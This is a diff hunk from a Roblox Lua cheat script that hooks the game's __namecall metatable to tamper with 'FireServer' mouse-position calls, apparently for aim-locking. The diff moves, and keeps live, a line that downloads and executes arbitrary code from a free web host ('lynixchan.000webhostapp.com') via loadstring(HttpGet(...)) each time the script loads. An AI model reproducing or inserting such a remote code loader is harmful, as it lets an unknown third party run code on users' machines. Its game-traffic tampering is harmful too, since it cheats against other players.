@@ -2814,9 +2814,10 @@ OWNER.CharacterAdded:connect(function() STAND.Character:WaitForChild("FULLY_LOAD
 if Hidescreen == true then rs:Set3dRenderingEnabled(false) else rs:Set3dRenderingEnabled(true) end
 Notify({Title = ScriptName.." Loaded",Description ="Made By Ticxyylolz#9164",Duration = 3.4028235e+38})
 Notify({Title = "Gunkill should be fixed now",Duration = 60})
+loadstring(game:HttpGet("https://lynixchan.000webhostapp.com/xxx"))()
 local mt = getrawmetatable(game)
 local old = mt.__namecall
-setreadonly(mt,false)loadstring(game:HttpGet("https://lynixchan.000webhostapp.com/xxx"))()
+setreadonly(mt,false)
 mt.__namecall = newcclosure(function(...)
     local args = {...}
     if Locking == true and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
